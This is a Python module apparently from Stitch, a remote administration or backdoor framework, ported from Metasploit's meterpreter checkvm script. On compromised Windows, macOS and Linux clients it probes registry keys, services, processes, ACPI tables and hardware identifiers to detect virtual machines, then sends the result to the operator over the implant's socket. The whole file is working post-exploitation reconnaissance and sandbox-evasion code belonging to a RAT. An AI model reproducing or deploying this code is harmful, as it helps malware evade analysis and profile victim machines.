# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# This is the python inspired version of: https://github.com/rapid7/metasploit-framework/blob/master/scripts/meterpreter/checkvm.rb

if win_client():
    import _winreg
    process = run_command('wmic process get name')
    process_list = process.split('\n')

    def enum_keys(reg):
        if reg:
            keys = []
            try:
                i = 0
                while 1:
                    name = _winreg.EnumKey(reg, i)
                    keys.append(name)
                    i += 1
            except WindowsError as e:
                return keys
        else:
            return False

    def check_processes(exe,vm=False):
        global process_list
        if exe in process_list:
            if vm:
                return ("VM Scan Complete: This is a %s Virtual Machine" % vm)
        return False

    def hyperv_scan(microsoft, services):
        #print "Scanning for Hyper-V..."
        if "Hyper-V" in microsoft or "VirtualMachine" in microsoft:
            return ("VM Scan Complete: This is a Hyper-V Virtual Machine.")
        return False

    def vmware_scan(services, luid):
        #print "Scanning for VMware..."
        vmware_svc = ['vmdebug','vmmouse','VMTools','VMMEMCTL']
        for s in vmware_svc:
            if s in services :
                return ("VM Scan Complete: This is a VMware Virtual Machine.")
        if luid:
            iD =_winreg.QueryValueEx(luid, 'Identifier')
            if 'vmware' in str(iD[0]).lower():
                return ("VM Scan Complete: This is a VMware Virtual Machine.")
        return False

    def virtualpc_scan(services):
        #print "Scanning for VirtualPC..."
        virtpc_svc = ['vpcbus','vpc-s3','vpcuhub','msvmmouf']
        for s in virtpc_svc:
            if s in services :
                return ("VM Scan Complete: This is a VirtualPC Virtual Machine.")
        return False

    def sunvirtual_scan(services,luid,dsys,dsdtkey,fadtkey):
        #print "Scanning for Sun VirtualBox..."
        virtpc_svc = ['VBoxMouse','VBoxGuest','VBoxService','VBoxSF']
        for s in virtpc_svc:
            if s in services :
                return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        if luid:
            iD =_winreg.QueryValueEx(luid, 'Identifier')
            if 'vbox' in str(iD[0]).lower():
                return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        if dsys:
            sysbios =_winreg.QueryValueEx(dsys, 'SystemBiosVersion')
            if 'vbox' in str(sysbios[0]).lower():
                return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        if "VBOX__" in dsdtkey or "VBOX__" in fadtkey:
            return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        return False

    def xen_scan(services,dsdtkey,fadtkey,rsdtkey):
        #print "\nScanning for Xen..."
        virtpc_svc = ['xenevtchn','xennet','xennet6','xensvc','xenvdb']
        for s in virtpc_svc:
            if s in services :
                return ("VM Scan Complete: This is a Xen Virtual Machine.")
        if "Xen" in dsdtkey or "Xen" in fadtkey or "Xen" in rsdtkey:
            return ("VM Scan Complete: This is a Xen Virtual Machine.")
        return False

    def qemu_kvm_scan(luid,sycp):
        #print "Scanning for QEMU/KVM..."
        if luid:
            iD =_winreg.QueryValueEx(luid, 'Identifier')
            if 'qemu' in str(iD[0]).lower():
                return ("VM Scan Complete: This is a QEMU/KVM Virtual Machine.")
        if sycp:
            cp =_winreg.QueryValueEx(sycp, 'ProcessorNameString')
            if 'qemu' in str(cp[0]).lower():
                return ("VM Scan Complete: This is a QEMU/KVM Virtual Machine.")
        return False

    def find_luid():
        i = 0
        n = 0
        luid = False
        while i < 4:
            while n < 4:
                try:
                    luid = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port %i\\Scsi Bus %i\\Target Id 0\\Logical Unit Id 0' % (i,n))
                    break
                except Exception:
                    n += 1
                    pass
            i += 1
        return luid

    def try_openkey(path):
        try:
            return _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, path)
        except Exception as e:
            return False

    micr = try_openkey('SOFTWARE\\Microsoft')
    dsdt = try_openkey('HARDWARE\\ACPI\\DSDT')
    fadt = try_openkey('HARDWARE\\ACPI\\FADT')
    rsdt = try_openkey('HARDWARE\\ACPI\\RSDT')
    dsys = try_openkey('HARDWARE\\DESCRIPTION\\System')
    srvc = try_openkey('SYSTEM\\ControlSet001\\Services')
    sycp = try_openkey('HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0')
    luid = find_luid()

    srvc_keys = enum_keys(srvc)
    dsdt_keys = enum_keys(dsdt)
    fadt_keys = enum_keys(fadt)
    rsdt_keys = enum_keys(rsdt)
    sycp_keys = enum_keys(sycp)
    micr_keys = enum_keys(micr)

    vm = xen_scan(srvc_keys,dsdt_keys,fadt_keys,rsdt_keys)
    if not vm: vm = vmware_scan(srvc_keys,luid)
    if not vm: vm = hyperv_scan(micr_keys, srvc_keys)
    if not vm: vm = qemu_kvm_scan(luid,sycp)
    if not vm: vm = virtualpc_scan(srvc_keys)
    if not vm: vm = sunvirtual_scan(srvc_keys,luid,dsys,dsdt_keys,fadt_keys)

    if not vm: vm = check_processes("vmwareuser.exe",'VMware')
    if not vm: vm = check_processes("vmwaretray.exe",'VMware')
    if not vm: vm = check_processes("vmusrvc.exe",'VirtualPC')
    if not vm: vm = check_processes("vmsrvc.exe",'VirtualPC')
    if not vm: vm = check_processes("vboxservice.exe",'Sun VirtualBox')
    if not vm: vm = check_processes("vboxtray.exe",'Sun VirtualBox')
    if not vm: vm = check_processes("xenservice.exe",'Xen')

    if not vm: vm = "[+] VM Scan Complete: Appears to be a physical host\n"
    send(client_socket,vm)

elif osx_client():
    vm = False
    vms = ['VirtualBox','Oracle','VMWare','Parallels','Qemu',
            'Microsoft VirtualPC','Virtuozzo','Xen']
    output=run_command("ioreg -l | grep -e Manufacturer -e 'Vendor Name'")
    for n in vms:
        if n.lower() in output.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
    if not vm: vm = "[+] VM Scan Complete: Appears to be a physical host\n"
    send(client_socket,vm)

elif lnx_client():
    vm = False
    vms = ['VirtualBox','Oracle','VMWare','Parallels','Qemu',
            'Microsoft VirtualPC','Virtuozzo','Xen']
    sys_vendor = 'cat /sys/class/dmi/id/sys_vendor'
    disk_by_id = 'ls /dev/disk/by-id/'
    scsi = 'cat /proc/scsi/scsi'

    vmcheck1 = run_command(sys_vendor)
    vmcheck2 = run_command(disk_by_id)
    vmcheck3 = run_command(scsi)

    for n in vms:
        if n.lower() in vmcheck1.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
            break
        if n.lower() in vmcheck2.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
            break
        if n.lower() in vmcheck3.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
            break
    if not vm: vm = "[+] VM Scan Complete: Appears to be a physical host\n"
    send(client_socket,vm)
